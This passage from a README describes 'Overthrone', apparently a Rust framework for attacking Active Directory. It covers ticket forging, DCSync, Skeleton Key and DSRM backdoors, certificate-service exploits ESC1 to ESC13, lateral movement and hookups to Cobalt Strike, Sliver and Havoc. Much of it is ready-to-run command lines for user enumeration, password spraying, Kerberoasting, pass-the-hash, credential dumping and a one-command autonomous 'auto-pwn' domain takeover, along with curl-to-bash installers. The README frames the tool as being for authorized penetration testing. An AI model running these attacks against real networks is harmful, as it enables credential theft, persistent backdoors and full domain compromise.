| **ADCS Relay (ESC8)** | Relay NTLM auth to AD Certificate Services web enrollment. Get a certificate as the victim. Certificates: the new hashes. | ✅ Full |

### Persistence (overthrone-forge)

Taking the throne is easy. Keeping it is an art form. This crate welds the crown to your head.

| Technique | What it does | Status |
|---|---|---|
| **DCSync** | Replicate credentials from the DC using MS-DRSR. Get every hash in the domain. The CEO's. The intern's. The service account from 2009 nobody remembers creating. | ✅ Full |
| **Golden Ticket** | Forge a TGT signed with the KRBTGT hash. Be any user. Access anything. The Willy Wonka golden ticket, except the factory is Active Directory. | ✅ Full (with PAC construction) |
| **Silver Ticket** | Forge a TGS for a specific service. Stealthier than Golden - no DC interaction needed. | ✅ Full |
| **Diamond Ticket** | Modify a legit TGT's PAC. Bypasses detections that check for TGTs not issued by the KDC. The stealth bomber of ticket forging. | ✅ Full |
| **Shadow Credentials** | Add a key credential to msDS-KeyCredentialLink via LDAP, then authenticate with PKINIT (real RSA signing + DH key exchange). The cool modern attack, and it actually works now. | ✅ Full (LDAP + PKINIT) |
| **ACL Backdoor** | Modify DACLs to grant yourself hidden permissions. The "I was always an admin, you just didn't notice" technique. | ✅ Full |
| **Skeleton Key** | Patch LSASS to accept a master password. Full orchestration: SMB connect → admin check → upload → SVCCTL exec → cleanup. Needs a C2 session on the DC. | ✅ Full (orchestration) |
| **DSRM Backdoor** | Set DsrmAdminLogonBehavior=2 via remote registry. Persistent backdoor via DSRM Administrator. | ✅ Full |
| **Forensic Cleanup** | Rollback every persistence technique. Because good pentesters clean up. Great pentesters never needed to. | ✅ Full |
| **Validation** | Verify persistence actually works post-deployment. Trust but verify. (Actually, just verify. This is offensive security.) | ✅ Full |

### ADCS Exploitation (overthrone-core)

AD Certificate Services: where Microsoft said "let's add PKI to Active Directory" and attackers said "thank you for your service."

| ESC | Attack | Status | Notes |
|---|---|---|---|
| **ESC1** | Enrollee supplies subject / SAN in request | ✅ Implemented | Full `Esc1Exploiter` - SAN UPN abuse, CSR generation, certificate enrollment, NT hash extraction from PKCS#12. 204 lines. The main character has arrived. |
| **ESC2** | Any purpose EKU + enrollee supplies subject | ✅ Implemented | Any Purpose certificates exploited via enrollment request manipulation. The "I can be anything" certificate. |
| **ESC3** | Enrollment agent + second template abuse | ✅ Implemented | Two-step: get enrollment agent cert, then request cert as victim. The buddy system of exploitation. |
| **ESC4** | Vulnerable template ACLs → modify to ESC1 | ✅ Implemented | Modify template permissions, then exploit. If you can write the rules, you can break the rules. |
| **ESC5** | Vulnerable PKI object permissions | ✅ Implemented | Abuse permissions on PKI infrastructure objects. |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | ✅ Implemented | Full `Esc6Exploiter` - detects and exploits the EDITF flag on CAs. Its name is longer than the code, but the code works. |
| **ESC7** | CA access control abuse (ManageCA rights) | ✅ Implemented | CA permission manipulation. |
| **ESC8** | Web enrollment NTLM relay | ✅ Implemented | Full relay with the overthrone-relay crate integration. |
| **ESC9** | No Security Extension + UPN poisoning | ✅ Implemented | Supports automated live LDAP mode (with supplied directory creds) plus guided mode for operator-driven UPN restore. |
| **ESC10** | Weak certificate mapping / weak binding enforcement | ✅ Implemented | Supports Variant A/B workflows with optional live LDAP automation for UPN mapping paths. |
| **ESC11** | NTLM relay to ICPR (`ICertPassage`) | ✅ Implemented | Includes assessment flow and optional live WINREG/SMB checks when CA host creds are supplied. |
| **ESC12** | CA private key exfiltration | ✅ Implemented | Generates operator workflow for backup/exfil and offline abuse where shell-level CA access exists. |
| **ESC13** | Issuance Policy OID to privileged group link | ✅ Implemented | Full exploit flow and PKINIT usage hints for privilege pivoting via linked group policy OIDs. |

### Remote Execution (overthrone-core)

Six lateral movement methods. All implemented. The `todo!()` trio graduated.

| Method | Protocol | Status | Notes |
|---|---|---|---|
| **WinRM (Linux/macOS)** | WS-Management + NTLM | ✅ Full | Pure Rust WS-Man with NTLM auth. Create shell, execute, receive output, delete shell. Cross-platform perfection. |
| **WinRM (Windows)** | Win32 WSMan API | ✅ Full | Commands execute via native Win32 API with real output collection via `WSManReceiveShellOutput`. The mystery is solved. |
| **AtExec** | ATSVC over SMB | ✅ Full | Scheduled task creation via named pipe. "Task Scheduler is a feature, not a vulnerability." |
| **PsExec** | DCE/RPC + SMB | ✅ Full | Real DCE/RPC bind packet building, service creation, payload upload to ADMIN$, execution, cleanup. The sports car now has a steering wheel. |
| **SmbExec** | SCM over SMB | ✅ Full | Service-based command execution via SMB named pipes. Clean, simple, effective. |
| **WmiExec** | DCOM/WMI | ✅ Full (Windows) | WMI-based semi-interactive command execution with output retrieval via SMB. ⚠️ Windows only - returns a clear error on Linux/macOS. |

### C2 Framework Integration (overthrone-core)

The C2 integration that went from "aspirational" to "actually works." Three backends, all with real HTTP clients, real auth flows, and real API calls.

| Framework | What It Does | Auth | Status |
|---|---|---|---|
| **Sliver** | Full C2Channel trait - sessions, beacons, exec, PowerShell, upload/download, assembly, BOF, shellcode inject, implant generation, listener management. Operator `.cfg` parsing with mTLS. | mTLS (certificate + CA from operator config) | ✅ Full |
| **Havoc** | Full C2Channel trait - Demon agent management, shell/PowerShell exec, upload/download, .NET assembly exec, BOF exec, shellcode inject, payload generation. Task polling with 5-min timeout. | Token or password auth (REST login endpoint) | ✅ Full |
| **Cobalt Strike** | Full C2Channel trait - beacon management, BOF execution, shellcode injection, payload generation. Aggressor-style REST API. | Bearer token or password auth | ✅ Full |

All three implement the complete `C2Channel` async trait: `connect`, `disconnect`, `list_sessions`, `get_session`, `exec_command`, `exec_powershell`, `upload_file`, `download_file`, `execute_assembly`, `execute_bof`, `shellcode_inject`, `deploy_implant`, `list_listeners`, `server_info`. The trait system is legitimately well-designed. The water is connected now.

### Crypto Layer (overthrone-core)

The layer that used to be the "Empty Files Hall of Shame." The shame has been resolved. The five one-line doc comments are now real implementations.

| Module | What It Does | Status |
|---|---|---|
| **AES-CTS** | AES256-CTS-HMAC-SHA1 for Kerberos etype 17/18. The thing that makes modern tickets work. | ✅ Full |
| **RC4** | RC4 encryption for Kerberos etype 23. The crypto equivalent of a screen door on a submarine, but AD still uses it everywhere. | ✅ Full |
| **HMAC** | HMAC utilities for ticket validation and integrity checking. | ✅ Full |
| **MD4** | MD4 hash for NTLM password hashing. The algorithm from 1990 that refuses to die, much like NTLM itself. | ✅ Full |
| **Ticket Crypto** | Ticket forging primitives - encryption, PAC signing, checksum computation. The mathematical foundation of ticket forging. | ✅ Full |
| **DPAPI** | LAPS v2 encrypted blob parsing, AES-256-GCM decryption, HMAC-SHA512 key derivation. With property-based tests using `proptest`. The module that doesn't exist? It exists now. | ✅ Full (with tests) |
| **GPP** | Group Policy Preferences cpassword AES decryption. Microsoft published the key. We just use it. | ✅ Full |
| **Cracker** | Offline hash cracking engine - embedded wordlist, rayon parallel processing, rule engine. | ✅ Full |

### Plugin System (overthrone-core)

| Component | Status | Notes |
|---|---|---|
| **Plugin Trait** | ✅ Full | Complete plugin API: manifest, capabilities, events, command execution. |
| **Native DLL Loading** | ✅ Full | `libloading`-based FFI with API version checking, manifest JSON parsing, function pointer caching. |
| **Built-in Example** | ✅ Full | SmartSpray plugin with lockout avoidance. A complete working example that actually spray-attacks responsibly. |
| **WASM Plugin Runtime** | ✅ Full | Wasmtime engine, module compilation, host function linking (`env.log`, `env.graph_add_node`, `env.graph_add_edge`). Plugins load, execute, and maintain state between calls. Manifest custom section parsing works. Memory allocation tries plugin's `allocate()` first. The engine is tuned and road-ready. |

### Autonomous Planning (overthrone-pilot)

The "I'll hack it myself" engine. Now with machine learning.

| Feature | Status |
|---|---|
| **Attack Planner** | ✅ Plans multi-step attack chains from enumeration data |
| **Step Executor** | ✅ Executes each planned step by calling Hunter/Forge/Reaper. 90KB of execution logic. |
| **Adaptive Strategy** | ✅ Adjusts plan on-the-fly based on what succeeds and fails |
| **Q-Learning AI** | ✅ Reinforcement learning engine (compiled by default) - ε-greedy policy with decay (0.3→0.05), learns optimal attack sequences across engagements via state-action reward tables. Shows state, decision, Q-value, and reward at every step. |
| **Goal System** | ✅ Target DA, Enterprise Admin, specific user, specific host |
| **Playbooks** | ✅ Pre-built YAML attack sequences for common scenarios |
| **Wizard Mode** | ✅ Interactive guided mode for manual control with autopilot assist |
| **Session Resume** | ✅ `--resume <file>` reloads serialized `EngagementState` from a previous run. VPN dropped? Pick up mid-chain from the exact step where you left off. |
| **TOML Config** | ✅ `--config <file>` loads engagement params from a TOML file. Set DC, domain, auth, targets, adaptive mode, jitter, and more without repeating flags every run. |
| **Credential Vault** | ✅ Thread-safe in-process credential store (`CredStore`) with privilege ranking. Discovered credentials are ranked DA > Enterprise Admin > Local Admin > Service > Domain User and surfaced in the final report. |
| **OPSEC Noise Gate** | ✅ `--stealth` caps the noise budget at `Medium`. Steps rated `High` or `Critical` noise are skipped automatically. Every skipped step is logged in the audit trail. |
| **Auto-Pwn Runner** | ✅ Full engagement orchestrator: enum → graph → exploit → persist → report. Live kill-chain pipeline shows stage completion. Per-step output with noise level, priority, credential/host gains. 9-section final report: kill-chain visual, per-stage stats, goal status, credential table, admin hosts, loot summary, Q-learner session stats, adaptive summary, audit trail. |

### Reporting (overthrone-scribe)

The difference between a penetration test and a crime is paperwork. This crate does the paperwork.

| Format | Status | Notes |
|---|---|---|
| **Markdown** | ✅ Works | Technical report with findings, attack paths, and mitigations. For the team that has to fix things. |
| **JSON** | ✅ Works | Machine-readable for integration with SIEMs, ticketing systems, or your "how screwed are we" dashboard. |
| **PDF** | ✅ Works | Executive summary for people who think "Domain Admin" is a job title. Custom PDF renderer. |

Every report includes: findings with severity, full attack paths with hop-by-hop details, affected assets, MITRE ATT&CK mappings, remediation steps, mitigation recommendations, and attack narrative prose. Because "GenericAll on the Domain Object via nested group membership through a misconfigured ACE" means nothing to a CISO. "Anyone in marketing can become Domain Admin in 3 steps" does.

## Edge Types & Cost Model

The attack graph uses weighted edges. Lower cost = easier to exploit. The pathfinder minimizes total cost - finding the path of least resistance. Just like a real attacker. Just like electricity. Just like that one coworker who always finds the shortcut.

| Edge Type | Cost | Meaning |
|---|---|---|
| `MemberOf` | 0 | Group membership - free traversal, you already have it |
| `HasSidHistory` | 0 | SID History - legacy identity, free impersonation |
| `Contains` | 0 | OU/GPO containment - structural relationship |
| `AdminTo` | 1 | Local admin - direct compromise |
| `DcSync` | 1 | Replication rights - game over |
| `GenericAll` | 1 | Full control - you are God (of this specific object) |
| `ForceChangePassword` | 1 | Reset their password - aggressive but effective |
| `Owns` | 1 | Object owner - can grant yourself anything |
| `WriteDacl` | 1 | Modify permissions - give yourself GenericAll |
| `WriteOwner` | 1 | Change owner - give yourself Owns |
| `AllowedToDelegate` | 1 | Constrained delegation - impersonate to target service |
| `AllowedToAct` | 1 | RBCD - sneakier delegation abuse |
| `HasSession` | 2 | Active session - credential theft opportunity |
| `GenericWrite` | 2 | Write attributes - targeted property abuse |
| `AddMembers` | 2 | Add to group - escalate via group membership |
| `ReadLapsPassword` | 2 | Read LAPS - plaintext local admin password |
| `ReadGmsaPassword` | 2 | Read gMSA - service account password blob |
| `CanRDP` | 3 | RDP access - interactive logon |
| `CanPSRemote` | 3 | PS Remoting - command execution |
| `ExecuteDCOM` | 3 | DCOM execution - Excel goes brrr |
| `SQLAdmin` | 3 | SQL Server admin - `xp_cmdshell` is a "feature" |
| `TrustedBy` | 4 | Domain trust - cross-domain, requires more setup |
| `HasSpn` | 5 | Kerberoastable - offline cracking required |
| `DontReqPreauth` | 5 | AS-REP roastable - offline cracking required |
| `Custom(*)` | 10 | Unknown/custom - high cost, manual analysis needed |

## Protocol Stack

What Overthrone speaks fluently. All implemented in pure Rust:

| Protocol | Used for |
|---|---|
| **LDAP/LDAPS** | Domain enumeration, user/group/GPO/trust queries, ACL reading. AD's diary. |
| **Kerberos** | Authentication, TGT/TGS requests, ticket forging, roasting, PKINIT. The three-headed dog of authentication. |
| **SMB 2/3** | File operations, share enumeration, lateral movement, PtH. The universal remote of Windows networking. |
| **NTLM** | NT hash computation, NTLMv2 challenge-response, Pass-the-Hash. The protocol that refuses to die. |
| **MS-DRSR** | DCSync - replicating credentials via DRS RPC. Politely asking the DC for all credentials. |
| **MS-SAMR/RID** | SAM Remote - RID cycling, SID brute-force enumeration |
| **MSSQL/TDS** | Full TDS protocol client, auth, query execution, linked server crawling |
| **Remote Registry** | Remote registry manipulation via DCE/RPC |
| **DNS** | SRV record lookups for DC discovery via hickory-resolver |
| **PKINIT** | Certificate-based Kerberos pre-auth with RSA signing and DH key exchange |

Everything is implemented in Rust. No shelling out to `impacket`, no calling `mimikatz.exe`, no loading .NET assemblies, no Wine, no prayers to the Python dependency gods. Pure Rust protocol implementations talking raw bytes over the wire.

## Installation

### One-line install (Linux/macOS)

```bash
curl -fsSL https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.sh | bash
```

Auto-detects your platform, grabs the right binary, installs both `overthrone` and `ovt` to your PATH. Easier than misconfiguring a GPO.

### One-line install (Windows PowerShell)

```powershell
irm https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.ps1 | iex
```

Same thing, but for people who attack Active Directory from inside Active Directory. We respect the audacity.

### Download a binary

Grab the latest from [**Releases**](https://github.com/Karmanya03/Overthrone/releases):

| Platform | Binary | Architecture |
|---|---|---|
| **Windows** | [`overthrone-windows-x86_64.exe`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.2/overthrone-windows-x86_64.exe) | x86_64 |
| **Linux** | [`overthrone-linux-x86_64`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.2/overthrone-linux-x86_64) | x86_64 (musl, static) |
| **macOS** | [`overthrone-macos-aarch64`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.2/overthrone-macos-aarch64) | Apple Silicon (M1/M2/M3/M4) |

**Quick manual install:**

```bash
# Linux x86_64
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.2/overthrone-linux-x86_64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/

# macOS Apple Silicon
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.2/overthrone-macos-aarch64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/

# Kali (you're probably already here)
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.2/overthrone-linux-x86_64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/ && sudo apt install -y smbclient
```

### Build from source

For the trust-no-one crowd (respect - you're pentesters, paranoia is a job requirement):

```bash
git clone https://github.com/Karmanya03/Overthrone.git
cd Overthrone
cargo build --release

# Binaries at:
#   target/release/overthrone
#   target/release/ovt
# Same binary, two names. Like Clark Kent and Superman but less handsome.
```

### Post-install: smbclient

Overthrone is pure Rust with one external dependency. One. We tried to make it zero but `smb-rs` v0.11 doesn't expose directory listing yet. We're not bitter about it. (We're a little bitter about it.)

```bash
# Debian/Ubuntu/Kali
sudo apt install smbclient

# Arch (btw)
sudo pacman -S samba

# Fedora/RHEL
sudo dnf install samba-client

# macOS
brew install samba

# Windows
# Already there. Windows ships with SMB. It's the one time Windows having
# everything pre-installed actually works in your favor.
```

### Platform Support

| Platform | Status | Notes |
|---|---|---|
| **Kali Linux** | Recommended | Everything pre-installed. `smbclient` already there. This is the way. |
| **Linux** | Full support | Primary dev platform. All features. `apt install smbclient` and go. |
| **Windows** | Full support | Yes, you can attack AD from a Windows box. The irony writes itself. |
| **macOS** | Full support | Kerberos and LDAP work natively. `brew install samba` for SMB. Tim Cook would not approve. |
| **WSL** | Full support | Best of both worlds - Windows target, Linux attacker, one machine. |

---

## Wordlists

Overthrone does **not** bundle wordlists - bring your own. `--userlist` inputs and cracking `--wordlist` inputs accept any path on your system.

### Recommended: SecLists

```bash
# Kali (already installed)
ls /usr/share/seclists/

# Install on any Debian/Ubuntu system
sudo apt install seclists

# Or clone directly
git clone --depth=1 https://github.com/danielmiessler/SecLists.git ~/seclists
```

### Username Lists

```bash
# Zero-knowledge user enumeration - massive list, slow but thorough
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Faster: statistically likely first.last / f.last / flast formats
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/statistically-likely-usernames/john.smith.txt
/usr/share/seclists/Usernames/statistically-likely-usernames/jsmith.txt

# AD service account patterns
/usr/share/seclists/Usernames/Names/names.txt
```

### Password Lists

```bash
# Top 1000 - use for spraying (fast, stays under lockout threshold)
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# Seasonal passwords - highest hit rate in enterprise AD
/usr/share/seclists/Passwords/Seasonal/

# RockYou - offline cracking of captured hashes
/usr/share/wordlists/rockyou.txt

# Leaked AD passwords (actual corporate breach data)
/usr/share/seclists/Passwords/Leaked-Databases/
```

### Zero-Knowledge Kill Chain Example

```bash
# 1. Enumerate valid usernames - no credentials needed
ovt kerberos user-enum -H 192.168.57.11 -d north.sevenkingdoms.local \
  --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --output ./loot/valid_users.txt \
  --delay 100

# 2. AS-REP roast the valid list (any no-preauth accounts get auto-captured during step 1)
ovt kerberos asrep-roast -H 192.168.57.11 -d north.sevenkingdoms.local \
  -U ./loot/valid_users.txt

# 3. Crack captured hashes
ovt crack --file ./loot/asrep_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt

# 4. Spray valid users with most likely AD passwords
while IFS= read -r pw; do
  ovt spray -H 192.168.57.11 -d north.sevenkingdoms.local \
    --userlist ./loot/valid_users.txt \
    --password "$pw" \
    --delay 1000 --jitter 500
done < /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

---

## Usage

### Quick Start - Auto-Pwn

For when you want to go from "I have creds" to "I own the domain" in one command:

```bash
# Full form - let the AI handle it
overthrone auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Shorthand - for every occasion
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Stealth mode - when the SOC is awake
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' --stealth --jitter-ms 3000

# Load engagement params from a TOML config file
ovt auto-pwn --config ./corp-local.toml

# Resume a previous session (VPN dropped? no problem)
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' \
  --resume ~/.overthrone/sessions/corp.local-10.10.10.1.json

# Recon only - enumerate everything, touch nothing
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' --max-stage enumerate

# Q-Learning AI with persistent brain (gets smarter every run)
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' \
  --adaptive hybrid --q-table ./engagement_brain.json

# Run a canned playbook instead of goal-driven AI
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' \
  --playbook full-auto-pwn

# Dry run - plan the attack without pulling the trigger
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' --dry-run
```

That's it. Overthrone enumerates users, computers, groups, trusts, GPOs, and shares - builds the attack graph - finds the shortest path to DA - Kerberoasts, sprays, cracks hashes - escalates, moves laterally, DCSyncs, and generates a report. The Q-Learning engine (compiled by default in hybrid mode) remembers what worked and optimizes future runs. This time you can actually watch it work: every step announces itself with stage, noise level, and priority, then shows the result with credential/host gains. The Q-learner prints its state encoding, action decision, and reward after each step. The final report is a full breakdown - kill-chain completion visual, per-stage success/fail stats, credential table, admin host list, loot summary, Q-learner session stats, and audit trail. Go get coffee if you want, but you might actually enjoy watching this one.

### Manual Mode

```bash
# Step 1: Enumerate everything
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Step 2: Build and query the attack graph
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt graph path-to-da --from jsmith                      # all paths to DA
ovt graph path --from jsmith --to "Domain Admins"         # shortest path
ovt graph stats                                           # node/edge counts
ovt graph export --output graph.json                     # save it
ovt graph export --output bloodhound.json --bloodhound   # BloodHound format

# Step 3 (zero-knowledge): Enumerate valid usernames - no creds needed
# Uses Kerberos error codes to determine if each username exists.
# Bring your own wordlist - see the Wordlists section below.
ovt kerberos user-enum -H 10.10.10.1 -d corp.local \
  --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --output ./loot/valid_users.txt \
  --delay 100

# Also works with any other list
ovt kerberos user-enum -H 10.10.10.1 -d corp.local \
  --userlist /usr/share/seclists/Usernames/Names/names.txt

# Step 4: Kerberoast + AS-REP against discovered users
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -U ./loot/valid_users.txt -p 'Summer2026!'
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough

# Note: any no-preauth accounts found during user-enum automatically save
# their AS-REP hashes to ./loot/userenum_asrep_hashes.txt - free hashes.

# Step 5: Spray (respect the lockout policy)
ovt spray -H 10.10.10.1 -d corp.local --password 'Winter2026!' --userlist ./loot/valid_users.txt

# Step 5: Lateral movement
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin --nt-hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
ovt exec --target 10.10.10.50 --command "whoami /all" --method smbexec

# Step 6: Persist
ovt dump --target 10.10.10.1 ntds -d corp.local -u dadmin -p 'G0tcha!'
ovt forge golden --domain-sid S-1-5-21-... --krbtgt-hash <32hex> --output golden.kirbi
ovt forge silver --domain-sid S-1-5-21-... --service-hash <32hex> --spn cifs/dc01.corp.local --output silver.kirbi

# Step 7: Report
ovt report --format markdown --output engagement-report.md
ovt report --format json --output findings.json
ovt report --format pdf --output executive-summary.pdf
```

### Command Reference

See **[COMMAND-LIST.md](COMMAND-LIST.md)** for the complete reference with flags, examples, and cheat sheets.

## Examples

### Scenario 1: "I just got a foothold"

```bash
# 1. Enumerate
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Phished123!'

# 2. Build graph + find paths
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Phished123!'
ovt graph path-to-da --from jsmith
# 3 hops. The CISO will need to sit down.

# 3. Kerberoast the SPN account in the path
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Phished123!'
# Hashes saved to ./loot/kerberoast_hashes.txt
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough
# Got: SVC-BACKUP:Backup2019!

# 4. Pass-the-Hash to DC (or use the password if you cracked it)
ovt exec --target dc01.corp.local --command "whoami /all" -d corp.local -u SVC-BACKUP -p 'Backup2019!'
ovt exec --target dc01.corp.local --command "whoami /all" -d corp.local -u SVC-BACKUP --nt-hash <nthash>

# 5. DCSync - get all the hashes
ovt dump --target 10.10.10.1 ntds -d corp.local -u SVC-BACKUP -p 'Backup2019!'

# 6. Report
ovt report --format markdown --output corp-local-report.md
```

### Scenario 2: "Full auto-pwn, I have a meeting in an hour"

```bash
ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
# Go get coffee. Come back to: engagement-report.md
```

## FAQ

**Q: Is this legal?**
A: With explicit written authorization - absolutely. Without it - absolutely not. The difference between a pentester and a criminal is a signed document and a really good PowerPoint presentation.

**Q: How is this different from BloodHound?**
A: BloodHound shows you the path. Overthrone walks it. (And then forges a Golden Ticket at the end, cleans up, and generates a PDF about it.)

**Q: How is this different from Impacket?**
A: Impacket is a legendary Python protocol library. Overthrone reimplements the same protocols in Rust with a unified framework, autonomous planning, and integrated reporting. Impacket is the toolbox. Overthrone is the factory. Also, no `pip install` failures at 2 AM.

**Q: Why Rust?**
A: Memory safety. Single static binary. Native performance. No dependency hell. No Wine. No .NET. Also, explaining Rust lifetime errors to a rubber duck at 4 AM builds character.

**Q: Will this get caught by AV/EDR?**
A: Overthrone uses native protocol implementations that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop assemblies. That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice.

**Q: Does it need Wine or Mimikatz or .NET?**
A: No. No. And no. Every protocol is native Rust. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong.

**Q: Can I extend it with custom modules?**
A: Native DLL plugin loading works with a full Plugin trait. WASM plugins load and execute via wasmtime with state persistence, manifest parsing, and smart memory allocation. The workspace architecture makes adding new modules straightforward. PRs welcome.

**Q: What about the C2 integrations?**
A: They work now. Sliver (mTLS REST), Havoc (REST with auth), Cobalt Strike (Aggressor-style REST). Real HTTP clients, real API calls, real session management. The "aspirational code" era is over.

## Contributing

PRs welcome. Issues welcome. Memes about Active Directory misconfigurations are especially welcome. If your PR includes a pun in the commit message, it gets reviewed first.

## Star History

If you've read this far - all the way to the bottom of this README, past the crate report card, past the backlog table - you're legally obligated to star the repo. It's in the MIT license. (It's not in the MIT license. But it should be.)

**[Star this repo](https://github.com/Karmanya03/Overthrone)** - every star adds 0.001 damage to the attack graph.

## Disclaimer

This tool is for **authorized security testing only**. Using Overthrone against systems without explicit written permission is illegal, unethical, and will make your parents disappointed. The authors are not responsible for misuse.

Always:
- Get written authorization before testing
- Define scope and rules of engagement
- Don't break things you weren't asked to break
- Report everything you find, especially the embarrassing stuff
- Remember that somewhere, a sysadmin set `Password1` on a service account and hoped nobody would notice

## License

MIT - use it, modify it, learn from it, build on it. Just don't be evil with it.

***

<p align="center">
  <sub>Built with mass amounts of mass-produced instant coffee, mass amounts of Rust, and a personal grudge against misconfigured ACLs.</sub><br/>
  <sub>9 crates. Pure Rust protocols. Zero Python. One smbclient dependency. No regrets. (Some regrets.)</sub><br/>
  <sub>Every throne falls. The question is whether you find out from a pentester or from a ransomware note.</sub><br/>
  <sub>We prefer the first option. Your insurance company does too.</sub>
</p>
